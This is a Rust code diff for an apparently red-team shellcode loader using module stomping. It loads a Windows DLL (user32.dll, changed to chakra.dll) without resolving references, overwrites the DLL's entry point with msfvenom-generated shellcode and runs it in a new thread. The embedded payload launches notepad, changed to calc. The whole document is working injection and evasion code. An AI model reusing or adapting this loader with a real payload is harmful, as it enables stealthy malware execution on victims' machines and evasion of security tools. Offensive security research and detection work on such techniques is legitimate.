@@ -1,28 +1,20 @@
-use std::{ffi::c_void, ptr::null_mut};
-use ntapi::ntmmapi::{NtMapViewOfSection, ViewShare};
+use std::ffi::c_void;
 use windows::{
-    core::s,
-    Wdk::Storage::FileSystem::NtCreateSection,
+    core::{s, Error, Result},
     Win32::{
-        Foundation::{GENERIC_READ, HANDLE},
-        Storage::FileSystem::{
-            CreateFileA, FILE_ATTRIBUTE_NORMAL, 
-            FILE_SHARE_MODE, OPEN_EXISTING
-        },
+        Foundation::{E_FAIL, HANDLE},
         System::{
             Diagnostics::Debug::IMAGE_NT_HEADERS64,
-            Threading::{CreateThread, THREAD_CREATION_FLAGS},
+            LibraryLoader::{LoadLibraryExA, DONT_RESOLVE_DLL_REFERENCES},
+            Memory::{VirtualProtect, PAGE_PROTECTION_FLAGS, PAGE_READWRITE},
             SystemServices::{IMAGE_DOS_HEADER, IMAGE_NT_SIGNATURE},
-            Memory::{
-                VirtualProtect, PAGE_EXECUTE_READWRITE, PAGE_PROTECTION_FLAGS, 
-                PAGE_READONLY, PAGE_READWRITE, SECTION_ALL_ACCESS, SEC_IMAGE
-            }, 
+            Threading::{CreateThread, THREAD_CREATION_FLAGS},
         },
     },
 };
 
-// msfvenom -p windows/x64/exec CMD=notepad.exe -f rust
-const SHELLCODE: [u8; 279] = [
+// msfvenom -p windows/x64/exec CMD=notepad.exe -f rust EXITFUNC=thread
+const SHELLCODE: [u8; 276] = [
     0xfc, 0x48, 0x83, 0xe4, 0xf0, 0xe8, 0xc0, 0x00, 0x00, 0x00, 0x41, 0x51, 0x41, 0x50, 0x52, 0x51,
     0x56, 0x48, 0x31, 0xd2, 0x65, 0x48, 0x8b, 0x52, 0x60, 0x48, 0x8b, 0x52, 0x18, 0x48, 0x8b, 0x52,
     0x20, 0x48, 0x8b, 0x72, 0x50, 0x48, 0x0f, 0xb7, 0x4a, 0x4a, 0x4d, 0x31, 0xc9, 0x48, 0x31, 0xc0,
@@ -39,90 +31,72 @@ const SHELLCODE: [u8; 279] = [
     0x00, 0x00, 0x00, 0x00, 0x00, 0x48, 0x8d, 0x8d, 0x01, 0x01, 0x00, 0x00, 0x41, 0xba, 0x31, 0x8b,
     0x6f, 0x87, 0xff, 0xd5, 0xbb, 0xf0, 0xb5, 0xa2, 0x56, 0x41, 0xba, 0xa6, 0x95, 0xbd, 0x9d, 0xff,
     0xd5, 0x48, 0x83, 0xc4, 0x28, 0x3c, 0x06, 0x7c, 0x0a, 0x80, 0xfb, 0xe0, 0x75, 0x05, 0xbb, 0x47,
-    0x13, 0x72, 0x6f, 0x6a, 0x00, 0x59, 0x41, 0x89, 0xda, 0xff, 0xd5, 0x6e, 0x6f, 0x74, 0x65, 0x70,
-    0x61, 0x64, 0x2e, 0x65, 0x78, 0x65, 0x00,
+    0x13, 0x72, 0x6f, 0x6a, 0x00, 0x59, 0x41, 0x89, 0xda, 0xff, 0xd5, 0x63, 0x61, 0x6c, 0x63, 0x2e,
+    0x65, 0x78, 0x65, 0x00,
 ];
 
-fn main() -> Result<(), Box<dyn std::error::Error>> {
-    let address = load_file()?;
-    let module = address.0;
-    let entry_point = address.1;
-    println!("[+] Base Address: {:?}", module);
-    println!("[+] AddressOfEntryPoint: {:?}", entry_point);
-
+fn main() -> Result<()> {
+    // Load the target DLL and retrieve the entry point address
+    let entry_point = load_library()?;
     unsafe {
-        println!("[+] Changing protection from AddressOfEntryPoint to PAGE_READWRITE");
+        // Change the memory protection of the entry point to PAGE_READWRITE
         let mut old_protect = PAGE_PROTECTION_FLAGS(0);
-        VirtualProtect(entry_point,SHELLCODE.len(),PAGE_READWRITE,&mut old_protect)?;
+        VirtualProtect(
+            entry_point,
+            SHELLCODE.len(),
+            PAGE_READWRITE,
+            &mut old_protect,
+        )?;
 
-        println!("[+] Copying Shellcode to AddressOfEntryPoint");
-        std::ptr::copy_nonoverlapping(SHELLCODE.as_ptr(), entry_point as _, SHELLCODE.len());
+        // Copy the shellcode over the entry point
+        std::ptr::copy_nonoverlapping(SHELLCODE.as_ptr(), entry_point.cast(), SHELLCODE.len());
 
-        println!("[+] Back to the old protection");
+        // Restore the original memory protection
         VirtualProtect(entry_point, SHELLCODE.len(), old_protect, &mut old_protect)?;
 
-        CreateThread(None,0,Some(std::mem::transmute(entry_point)),None,THREAD_CREATION_FLAGS(0), None)?;
+        // Create a thread to execute the shellcode
+        CreateThread(
+            None,
+            0,
+            Some(std::mem::transmute(entry_point)),
+            None,
+            THREAD_CREATION_FLAGS(0),
+            None,
+        )?;
 
         println!("[+] Shellcode Executed!");
+        
+        // Wait for the thread to finish execution
         std::thread::sleep(std::time::Duration::from_secs(10));
 
         Ok(())
     }
 }
 
-fn load_file() -> Result<(*mut c_void, *mut c_void), String> {
+
+/// Loads a DLL into the process memory without resolving its dependencies,
+/// retrieves and returns the address of its entry point.
+///
+/// # Returns
+///
+/// * `Ok(*mut c_void)` - Pointer to the entry point of the loaded DLL.
+/// * `Err(Error)` - If the DLL cannot be loaded or its PE signature is invalid.
+fn load_library() -> Result<*mut c_void> {
     unsafe {
-        let h_file = CreateFileA(
-            s!("C:\\Windows\\System32\\user32.dll"),
-            GENERIC_READ.0,
-            FILE_SHARE_MODE(0),
-            None,
-            OPEN_EXISTING,
-            FILE_ATTRIBUTE_NORMAL,
-            None,
-        ).map_err(|e| format!("[!] CreateFileA Failed With Error: {e}"))?;
+        let module = LoadLibraryExA(
+            s!("chakra.dll"),
+            HANDLE::default(),
+            DONT_RESOLVE_DLL_REFERENCES,
+        )?
+        .0;
 
-        let mut section = HANDLE::default();
-        let status = NtCreateSection(
-            &mut section,
-            SECTION_ALL_ACCESS.0,
-            None,
-            None,
-            PAGE_READONLY.0,
-            SEC_IMAGE.0,
-            h_file,
-        );
-
-        if status.is_err() {
-            return Err(format!("[!] NtCreateSection Failed With Status: {:?}", status));
-        }
-
-        let mut mapped_module = null_mut();
-        let mut view_size = 0;
-        let status = NtMapViewOfSection(
-            section.0 as _,
-            0xffffffffffffffffu64 as _,
-            &mut mapped_module,
-            0,
-            0,
-            null_mut(),
-            &mut view_size,
-            ViewShare,
-            0,
-            PAGE_EXECUTE_READWRITE.0,
-        );
-
-        if status != 0 {
-            return Err(format!("[!] NtMapViewOfSection Failed With Status: {}", status));
-        }
-
-        let dos_header = mapped_module as *mut IMAGE_DOS_HEADER;
-        let nt_header = (mapped_module as usize + (*dos_header).e_lfanew as usize) as *mut IMAGE_NT_HEADERS64;
+        let dos_header = module as *mut IMAGE_DOS_HEADER;
+        let nt_header = (module as usize + (*dos_header).e_lfanew as usize) as *mut IMAGE_NT_HEADERS64;
         if (*nt_header).Signature != IMAGE_NT_SIGNATURE {
-            return Err(String::from("IMAGE SIGNATURE INVALID"));
+            return Err(Error::new(E_FAIL, "IMAGE SIGNATURE INVALID"));
         }
 
-        let entry_point = (mapped_module as usize + (*nt_header).OptionalHeader.AddressOfEntryPoint as usize) as *mut c_void;
-        Ok((mapped_module as *mut c_void, entry_point))
+        let entry_point = (module as usize + (*nt_header).OptionalHeader.AddressOfEntryPoint as usize) as *mut c_void;
+        Ok(entry_point)
     }
 }
